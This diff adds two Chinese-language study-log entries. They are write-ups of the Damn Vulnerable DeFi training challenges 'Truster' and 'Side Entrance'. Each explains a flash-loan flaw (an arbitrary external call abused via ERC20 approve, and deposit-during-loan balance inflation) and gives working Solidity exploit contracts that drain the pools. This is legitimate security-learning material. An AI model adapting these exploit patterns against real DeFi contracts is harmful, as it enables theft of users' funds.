@@ -1090,4 +1090,119 @@ function test_naiveReceiver() public checkSolvedByPlayer {
 
 - 有點燒腦...
 
+### 2024.09.14
+
+- 繼續進行每日解一題挑戰
+- 今天這一題 Truster 的解法比較簡單，解法也比較快
+- 所以另外花了時間複習了一下昨天解題需要知道的 EIP712 標準
+
+
+#### [DamnVulnerableDeFi-03] Truster
+
+- 過關條件: 把 `TrusterLenderPool` 合約持有的 DVT 代幣餘額榨乾
+  - [已知 `TrusterLenderPool` 有 100 萬顆 DVT 代幣](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/truster/Truster.t.sol#L36)
+  - 並且沒有發給我們任何 DVT 代幣
+  - 我們只能有 `TrusterLenderPool.flashLoan()` 函數可以呼叫
+- 解法:
+  - 這一題的合約代碼簡單許多，只有 `TrusterLenderPool.flashLoan()` 需要關注
+  - 所以漏洞肯定藏在 `TrusterLenderPool.flashLoan()` 裡面
+  - 但 `flashLoan()` 有個限制: 閃電貸之後，balance 必須大於 `balanceBefore`
+    - 並且這個函數有重入保護
+  - 所以唯一可疑的地方就在 [target.functionCall(data)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/truster/TrusterLenderPool.sol#L28) 了
+  - 此處的 [target.functionCall(data)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/truster/TrusterLenderPool.sol#L28) 是一個非常明顯很不安全的作法
+  - 一般來說，正常的閃電貸應該會是 callback 到調用者的 context 裡面，讓調用者(borrower)來決定拿到貸款後要做什麼操作
+  - 可是這邊，很明顯的是**由 `TrusterLenderPool` 代為操作**
+  - **即: `TrusterLenderPool` 存在任意代碼執行漏洞**
+  - 所以我們現在知道，我們可以以 `TrusterLenderPool` 的身份，去執行我們想做的任意 Operations
+  - 那麼現在問題在於，我們應該怎麼透過這個漏洞把 DVT token 偷走呢？有 `balanceBefore` 檢查耶
+  - 答案就是利用 `ERC20.approve()`，讓 `TrusterLenderPool` 給我們的帳號授予 spender 轉帳權限就好了
+
+- 先構造解答程式碼出來:
+
+```solidity=
+function test_truster() public checkSolvedByPlayer {
+    uint256 amount = 1;
+    address borrower = address(pool);
+    address target = address(token);
+    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, type(uint256).max);
+    pool.flashLoan(amount, borrower, target, data);
+    token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+}
+```
+
+- 你會發現這時候執行 `forge test --match-path test/truster/Truster.t.sol  -vvvv` 是會得到 revert 的
+- `[FAIL. Reason: Player executed more than one tx: 0 != 1] test_truster()`
+- 因為題目要求我們必須只能用一個 transaction 來解答
+- 但我們可以偷偷把 [assertEq(vm.getNonce(player), 1)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/truster/Truster.t.sol#L67) 註解掉
+- 再次執行，是會成功運行的，代表我們的漏洞利用思路是正確的
+- 只差要把 Exploit 寫成一個 Contract，再丟去執行即可
+- 所以我們再次修改 Exploit Code 即可
+
+```
+function test_truster() public checkSolvedByPlayer {
+    new Exploit(token, pool, recovery, TOKENS_IN_POOL);
+}
+
+contract Exploit {
+    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery, uint256 TOKENS_IN_POOL) {
+        uint256 amount = 1;
+        address borrower = address(pool);
+        address target = address(token);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+        pool.flashLoan(amount, borrower, target, data);
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+    }
+}
+```
+
+- [DamnVulnerableDeFi-03-Truster.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-03-Truster.t.sol)
+
+
+### 2024.09.16
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-04] Side Entrance
+
+- 過關條件: 把 `SideEntranceLenderPool` 合約持有的 1000 顆 ETH 偷走，轉到 recovery 帳號
+- 解法:
+  - 這題有點水，直接講解法
+  - 我們只要發起 `flashLoan()` 呼叫
+  - 在 `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` 的 callback context 中，呼叫 `deposit()` 把閃電貸借款直接存進去
+  - 因為 `SideEntranceLenderPool` 只是單純的檢查 `flashLoan()` 前與後的 balance，所以利用這種方式就可以讓我們憑空增加 `balances[msg.sender]`
+  - 最後再呼叫 `withdraw()` 把 `SideEntranceLenderPool` 合約的 ETH 幹走即可
+
+```solidity
+function test_sideEntrance() public checkSolvedByPlayer {
+    Exploit exp = new Exploit(pool, ETHER_IN_POOL);
+    exp.start();
+    payable(recovery).transfer(ETHER_IN_POOL);
+}
+
+contract Exploit {
+    SideEntranceLenderPool pool;
+    uint256 ETHER_IN_POOL;
+
+    constructor(SideEntranceLenderPool _pool, uint256 _ETHER_IN_POOL) {
+        pool = _pool;
+        ETHER_IN_POOL = _ETHER_IN_POOL;
+    }
+    
+    function start() external {
+        pool.flashLoan(ETHER_IN_POOL);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+```
+
+- [DamnVulnerableDeFi-04-SideEntrance.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-04-SideEntrance.t.sol)
+
+
 <!-- Content_END -->
